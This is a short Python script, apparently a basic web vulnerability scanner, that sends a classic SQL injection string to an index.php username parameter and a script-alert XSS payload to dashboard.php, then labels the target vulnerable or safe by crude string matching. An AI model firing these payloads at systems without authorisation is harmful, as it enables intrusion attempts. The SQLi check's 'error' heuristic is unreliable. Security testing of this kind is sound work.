import requests, urllib.parse, sys
def check_sql(url): r=requests.get(url+"' OR '1'='1"); print("[SQLi]", "Vulnerable" if "error" in r.text.lower() else "Safe")
def check_xss(url): p="<script>alert(1)</script>"; r=requests.get(url+"?msg="+urllib.parse.quote(p)); print("[XSS]", "Vulnerable" if p in r.text else "Safe")
def scan(b): print("Scanning",b); check_sql(b+"index.php?username="); check_xss(b+"dashboard.php")
if __name__=="__main__": scan(sys.argv[1])